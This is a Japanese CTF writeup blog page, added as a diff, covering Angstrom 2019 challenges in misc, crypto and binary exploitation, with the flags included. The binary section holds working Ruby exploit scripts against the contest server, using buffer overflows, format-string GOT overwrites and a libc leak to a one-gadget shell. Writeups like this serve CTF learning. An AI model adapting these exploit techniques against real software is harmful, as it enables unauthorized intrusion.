@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+
+
+<base href="https://alicemacs.com/">
+
+<title>
+  $ make life - Angstrom2019 writeup 
+</title>
+
+<meta name="generator" content="Hugo 0.54.0" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,400|Roboto+Slab:400,700|Roboto:300,300i,400,400i,500,500i,700,700i">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+<link rel="stylesheet" href="https://alicemacs.com/css/main.css">
+<link rel="stylesheet" href="https://alicemacs.com/css/custom.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="theme-color" content="#ffffff">
+
+</head>
+<body lang="ja">
+<div class="container">
+
+
+<header class="row text-left title">
+  <h1 class="title">Angstrom2019 writeup</h1>
+</header>
+<section id="category-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-left meta">
+        PUBLISHED ON APR 25, 2019 
+      
+      
+      
+      —
+      
+      
+      <a class="meta" href="/categories/writeup">WRITEUP</a>
+      
+      
+      
+    </h6>
+  </div>
+  
+</section>
+<section id="content-pane" class="row">
+  <div class="col-md-12 text-justify content">
+    
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#irc">IRC</a></li>
+</ul></li>
+<li><a href="#the-mueller-report">The mueller Report</a></li>
+<li><a href="#blank-pdf">Blank PDF</a></li>
+<li><a href="#paper-trail">Paper Trail</a></li>
+<li><a href="#scratch-it-out">Scratch It Out</a></li>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#control-you">Control you</a></li>
+</ul></li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#classy-cipher">Classy Cipher</a></li>
+<li><a href="#really-secure-algorithm">Really Secure Algorithm</a></li>
+</ul></li>
+<li><a href="#half-and-half">Half and Half</a></li>
+<li><a href="#runes">Runes</a></li>
+<li><a href="#binary">Binary</a>
+<ul>
+<li><a href="#aquarium">Aquarium</a></li>
+<li><a href="#chain-of-rope">Chain of Rope</a></li>
+<li><a href="#purchases">Purchases</a></li>
+<li><a href="#returns">Returns</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+    
+    
+
+<h2 id="misc">Misc</h2>
+
+<h3 id="irc">IRC</h3>
+
+<ul>
+<li>freenodeに入るとFLAG</li>
+<li><strong>actf{like_discord_but_worse}</strong></li>
+</ul>
+
+<h2 id="the-mueller-report">The mueller Report</h2>
+
+<ul>
+<li>PDFが渡されるので、とりあえず<code>actf</code>でgrepするとFLAG</li>
+<li><strong>actf{no0o0o0_col1l1l1luuuusiioooon}</strong></li>
+</ul>
+
+<h2 id="blank-pdf">Blank PDF</h2>
+
+<ul>
+<li>PDFが渡されるが開けず、<code>file</code>コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG</li>
+<li><strong>actf{knot_very_interesting}</strong></li>
+</ul>
+
+<h2 id="paper-trail">Paper Trail</h2>
+
+<ul>
+<li>pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している</li>
+<li><strong>actf{fake_math_papers}</strong></li>
+</ul>
+
+<h2 id="scratch-it-out">Scratch It Out</h2>
+
+<ul>
+<li>project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる</li>
+<li>project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される</li>
+<li>最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる</li>
+<li>地味に面白い</li>
+<li><strong>actf{Th5_0pT1maL_LANgUaG3}</strong></li>
+</ul>
+
+<h2 id="web">Web</h2>
+
+<h3 id="control-you">Control you</h3>
+
+<ul>
+<li>HTMLソースを見てFLAG</li>
+<li><strong>actf{control_u_so_we_can&rsquo;t_control_you}</strong></li>
+</ul>
+
+<h2 id="crypto">Crypto</h2>
+
+<h3 id="classy-cipher">Classy Cipher</h3>
+
+<ul>
+<li>ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く</li>
+<li><strong>actf{so_charming}</strong></li>
+</ul>
+
+<pre><code class="language-python">encrypted = ':&lt;M?TLH8&lt;A:KFBG@V'
+
+for i in range(0xff):
+    for c in encrypted:
+        print(chr((ord(c)-i) % 0xff), end='')
+</code></pre>
+
+<h3 id="really-secure-algorithm">Really Secure Algorithm</h3>
+
+<ul>
+<li>RSAのパラメータがe, p, q, cが渡されるので復号するだけ</li>
+<li><strong>actf{really_securent_algorithm}</strong></li>
+</ul>
+
+<pre><code class="language-ruby">require_relative '../../tools/ctf/crypto.rb'
+
+p = 8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889
+q = 7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493
+e = 65537
+c = 7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349
+
+rsa = RSA.new(e, p * q, p, q)
+m = rsa.decrypt(c)
+print([m.to_s(16)].pack(&quot;H*&quot;))
+</code></pre>
+
+<h2 id="half-and-half">Half and Half</h2>
+
+<ul>
+<li>ソースコードが渡されるので呼んでソルバを書くだけ
+
+<ul>
+<li>24文字を12byteに分割しxor取った値に等しくなるようにする</li>
+<li>フラグフォーマットは、<code>actf{</code>なので先頭5byteと後半の5byteもxorして判明(<code>taste</code>)</li>
+<li>問題文から<code>taste</code>に合うような単語で<code>coffee</code>を<code>actf{</code>の後に繋げると後半が<code>good</code>と文章が成り立つ</li>
+</ul></li>
+<li><strong>actf{coffee_tastes_good}</strong></li>
+</ul>
+
+<h2 id="runes">Runes</h2>
+
+<ul>
+<li>Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ
+
+<ul>
+<li>復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている</li>
+</ul></li>
+<li><strong>actf{crypto_lives}</strong></li>
+</ul>
+
+<pre><code class="language-ruby">require 'gmp'
+
+n = GMP::Z(99157116611790833573985267443453374677300242114595736901854871276546481648883)
+p = 310013024566643256138761337388255591613
+q = 319848228152346890121384041219876391791
+g = GMP::Z(99157116611790833573985267443453374677300242114595736901854871276546481648884)
+c = GMP::Z(2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869)
+l = GMP::Z((p - 1).lcm(q - 1))
+def L(u, n)
+  (u - 1) / n
+end
+c_lambda = L(c.powmod(l, n.pow(2)), n)
+g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
+m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
+print([m].pack(&quot;H*&quot;))
+</code></pre>
+
+<h2 id="binary">Binary</h2>
+
+<h3 id="aquarium">Aquarium</h3>
+
+<ul>
+<li>gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ</li>
+<li><strong>actf{overflowed_more_than_just_a_fish_tank}</strong></li>
+</ul>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+
+require 'pwn'
+
+#z = Sock.new &quot;localhost&quot;, 9999
+z = Sock.new &quot;shell.actf.co&quot;, 19305
+
+payload = &quot;A&quot; * 0x98 + p32(0x4011b6)
+z.recvuntil &quot;: &quot;
+z.sendline &quot;1&quot;
+z.recvuntil &quot;: &quot;
+z.sendline &quot;1&quot;
+z.recvuntil &quot;: &quot;
+z.sendline &quot;1&quot;
+z.recvuntil &quot;: &quot;
+z.sendline &quot;1&quot;
+z.recvuntil &quot;: &quot;
+z.sendline &quot;1&quot;
+z.recvuntil &quot;: &quot;
+z.sendline &quot;1&quot;
+z.recvuntil &quot;: &quot;
+z.sendline payload
+
+puts z.recv
+</code></pre>
+
+<h3 id="chain-of-rope">Chain of Rope</h3>
+
+<ul>
+<li>名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)</li>
+<li><strong>actf{dark_web_bargains}</strong></li>
+</ul>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+
+require 'pwn'
+
+z = Sock.new &quot;localhost&quot;, 9999
+z = Sock.new &quot;shell.actf.co&quot;, 19400
+
+puts z.recvuntil(&quot;access\n&quot;)
+z.sendline &quot;1&quot;
+
+payload = &quot;A&quot; * 0x38 + p64(0x401231)
+z.sendline payload
+
+p z.recv
+</code></pre>
+
+<h3 id="purchases">Purchases</h3>
+
+<ul>
+<li>FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる</li>
+<li>関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする
+
+<ul>
+<li>末尾2byteですむので楽に書き換えられる</li>
+</ul></li>
+<li><strong>actf{limited_edition_flag}</strong></li>
+</ul>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+require 'pwn'
+# z = Sock.new &quot;localhost&quot;, 9999
+z = Sock.new &quot;shell.actf.co&quot;, 19011
+puts z.recvuntil &quot;? &quot;
+z.sendline &quot;%4534c%10$hnAAAA\x18\x40\x40&quot;
+puts z.recvuntil &quot;else. &quot;
+puts z.recv
+</code></pre>
+
+<h3 id="returns">Returns</h3>
+
+<ul>
+<li>Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ</li>
+<li>libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う</li>
+<li>出力バイトの関係から分割して書き込むために、はじめに<code>puts@got</code>をmainに書き換えておき何度もFSBを使えるようにする</li>
+<li><code>__stack_chk_fail@got</code>は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える</li>
+<li>最後に、<code>puts@got</code>を<code>__stack_chk_fail@got</code>になおしてあげればOne gadgetが実行される</li>
+<li><strong>actf{no_returns_allowed}</strong></li>
+</ul>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+# coding: utf-8
+require 'pwn'
+#z = Sock.new &quot;localhost&quot;, 8888
+z = Sock.new &quot;shell.actf.co&quot;, 19307
+context.log_level = :debug
+libc = ELF.new &quot;./libc.so.6&quot;
+#z = Sock.new &quot;shell.actf.co&quot;, 19011
+puts z.recvuntil &quot;? &quot;
+
+# Leaking libc address and overwriting puts@got to the entrypoint of main function
+z.sendline &quot;%4518c%11$hnAAAABBB%17$p\x18\x40\x40&quot;
+data = z.recvuntil &quot;? &quot;
+data = data.gsub(/\s/,&quot;&quot;)
+libc_start_main = data.match(/BBB(.*)@@\./)[1].chop.to_i(16) - 240
+libc_base = libc_start_main - libc.symbols['__libc_start_main']
+puts &quot;libc base address = #{libc_base.to_s(16)}&quot;
+
+one_gadget = libc_base + 0xf02a4
+high = (one_gadget &amp; 0xffffffff00000000) &gt;&gt; 32
+low = one_gadget &amp; 0xffffffff
+llow = (low &amp; 0xffff0000) &gt;&gt; 16
+hlow = low &amp; 0xffff
+
+# Overwriting __stack_chk_fail@got to one gadget RCE
+payload = &quot;%#{high}c%11$hnAAAABBBBBBB\x2c\x40\x40&quot;
+z.sendline payload
+z.recvuntil &quot;? &quot;
+
+payload = &quot;%#{hlow}c%11$hnAAAABBBBBBB\x28\x40\x40&quot;
+z.sendline payload
+z.recvuntil &quot;? &quot;
+
+payload = &quot;%#{llow}c%11$hnAAAABBBBBBB\x2a\x40\x40&quot;
+z.sendline payload
+z.recvuntil &quot;? &quot;
+
+STDIN.gets
+payload = &quot;%4892c%11$hnAAAABBB%17$p\x18\x40\x40&quot;
+z.sendline payload
+
+z.interact
+</code></pre>
+
+  </div>
+</section>
+<section id="tag-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-right meta">
+      
+    </h6>
+  </div>
+  
+</section>
+
+
+
+
+
+
+
+
+<section id="menu-pane" class="row menu text-center">
+  
+  
+  <span><a class="menu-item" href="https://alicemacs.com/blog/volga2019/">&lt; prev | </a></span>
+  
+  
+  <span><a class="menu-item" href="/blog">blog</a></span>
+  
+  
+  <span><a class="menu-item" href="https://alicemacs.com/blog/yara/"> | next &gt;</a></span>
+  
+  
+  <h4 class="text-center"><a class="menu-item" href="https://alicemacs.com/">home</a></h4>
+</section>
+
+
+
+<footer class="row text-center footer">
+  <hr />
+  
+  <h6 class="text-center copyright">© 2019. Chihiro Hasegawa. <a href="https://creativecommons.org/licenses/by/3.0/">Some Rights Reserved</a>.</h6>
+  
+  <h6 class="text-center powered">Powered by <a href="https://gohugo.io/">Hugo  v0.54.0</a> &amp; <a href="https://github.com/shenoybr/hugo-goa">Goa</a>.</h6>
+  
+      
+      <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
+    
+  
+</footer>
+
+</div>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+
+<script type="text/javascript">
+hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js"></script>
+</body>
+</html>
+
+
